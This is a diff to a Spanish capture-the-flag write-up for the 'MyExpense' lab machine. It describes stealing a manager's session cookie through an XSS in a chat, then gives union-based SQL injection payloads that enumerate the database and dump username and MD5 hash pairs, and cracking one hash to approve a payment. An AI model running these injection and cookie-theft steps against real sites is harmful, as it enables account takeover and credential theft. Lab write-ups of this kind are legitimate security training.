@@ -32,8 +32,8 @@ La única pista que nos dan es: ```samuel/fzghn4lw```, lo cual parecen unas cred
   * [Reconocimiento de la página web](#reconocimiento-web)
 * [Fase de explotación](#explotacion)
   * [Nos logeamos como slamotte](#slamotte)
-  * [Nos convertimos en mriviere](#mriviere)
-  * [Nos convertimos en pboundi](#pboundi)
+  * [Convirtiéndonos en mriviere](#mriviere)
+  * [Convirtiéndonos en pbaudouin](#pbaudouin)
 
 <a id="reconocimiento"></a>
 ## Fase de reconocimiento
@@ -160,6 +160,9 @@ Si nos vamos al apartado del perfil, podemos ver quién es nuestro mánager: Man
 
 Si alguien tiene que tramitar nuestro pago, por lógica tiene que ser él. Por lo tanto tenemos que ver la forma de que nos acepte el pago.
 
+<a id="mriviere"></a>
+### Convirtiéndonos en mriviere
+
 Si intentamos inyectar html en el chat, podremos observar que se produce un *XSS*. La idea aquí será robar las cookie de sesión de la persona que vea el mensaje y probar suerte de que mriviere caiga en nuestra trampa.
 
 Para ello referenciaré un script en *js* llamado ```stealCookie.js```:
@@ -187,4 +190,87 @@ Aquí podemos ver la petición del pago y le damos a aceptar. Pero esto no es su
 
 ![](/assets/images/vh-writeup-myexpense/whoisManagerOfManager.png)
 
-En las cookies anteriores se encuentra este usuario. Sin embargo, como es un administrador, aparece una alerta de que no pueden haber dos
+En las cookies anteriores se encuentra este usuario. Sin embargo, como es un administrador, aparece una alerta de que no pueden haber dos sesiones abiertas de un administrador. Por lo tanto, tenemos que intentar llegar a él de otra forma.
+
+![](/assets/images/vh-writeup-myexpense/mgmNoMeDeja.png)
+
+<a id="pbaudouin"></a>
+### Convirtiéndonos en pbaudouin
+
+Si nos vamos al apartado *Rennes*, podremos ver una lista de elmentos. Si nos fijamos en la url, hay un parámetro llamado **id**. Podemos intentar probar un [SQLI (SQL Injection)](https://portswigger.net/web-security/sql-injection) escribiendo ```?id=2 or sleep(5)``` podremos observar como la página se queda cargando durante un buen rato así que podemos decir que funciona.
+
+> El apartado *Rennes* estará disponible siempre que estemos logueados como mriviere
+
+![](/assets/images/vh-writeup-myexpense/sqliDetection.png)
+
+Hacemos un **union select** para ver en que parte de la interfaz se puede ver la inyección:
+
+```sql
+?id=2 union select 1,2-- -
+```
+![](/assets/images/vh-writeup-myexpense/firstUnionSelect.png)
+
+Listamos las bases de datos:
+
+```sql
+?id=2 union select 1,schema_name from information_schema.schemata-- -
+```
+![](/assets/images/vh-writeup-myexpense/databases.png)
+
+Listamos las tablas de la base de datos *myexpense*:
+
+```sql
+?id=2 union select 1,table_name from information_schema.tables where table_schema='myexpense'-- -
+```
+![](/assets/images/vh-writeup-myexpense/tables.png)
+
+Listamos las columnas de la tabla user de la base de datos *myexpense*:
+
+```sql
+?id=2 union select 1,colunm_name from information_schema.columns where table_schema='myexpense' and table_name='user'-- -
+```
+![](/assets/images/vh-writeup-myexpense/columns.png)
+
+Listamos los usuarios con sus contraseñas:
+
+```sql
+?id=2 union select 1,group_concat(username,0x3a,password) from user-- -
+```
+> 0x3a es la representación del carácter (:). Esto lo hacemos para que no nos de problema con el url-encode y nos muestre los datos en formato username:pasword
+
+![](/assets/images/vh-writeup-myexpense/passwordsSQLI.png)
+
+Por lo tanto tenemos las contraseñas de todos los usuarios:
+
+```
+afoulon:124922b5d61dd31177ec83719ef8110a
+pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a
+rlefrancois:ef0dafa5f531b54bf1f09592df1cd110
+mriviere:d0eeb03c6cc5f98a3ca293c1cbf073fc
+mnguyen:f7111a83d50584e3f91d85c3db710708
+pgervais:2ba907839d9b2d94be46aa27cec150e5
+placombe:04d1634c2bfffa62386da699bb79f191
+triou:6c26031f0e0859a5716a27d2902585c7
+broy:b2d2e1b2e6f4e3d5fe0ae80898f5db27
+brenaud:2204079caddd265cedb20d661e35ddc9
+slamotte:21989af1d818ad73741dfdbef642b28f
+nthomas:a085d095e552db5d0ea9c455b4e99a30
+vhoffmann:ba79ca77fe7b216c3e32b37824a20ef3
+rmasson:ebfc0985501fee33b9ff2f2734011882
+```
+
+A nosotros nos interesa:
+```
+pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a
+```
+
+Si metemos esta contraseña encriptada en [CrackStation](https://crackstation.net/), nos dará como resultado ```HackMe```.
+
+![](/assets/images/vh-writeup-myexpense/crackStation.png)
+
+Ahora que sabemos cual es la contraseña de la persona que nos tiene que tramitar el pago, volvemos a la página web, nos logueamos con sus credenciales y aceptamos el pago.
+
+Con esto, el objetivo de la máquina fue completado y por lo tanto la hemos terminado. De todas formas si quieres ver una flag puedes volver a loguearte como slamotte y te aparecerá una notificación con un mensaje de enhorabuena.
+
+
+
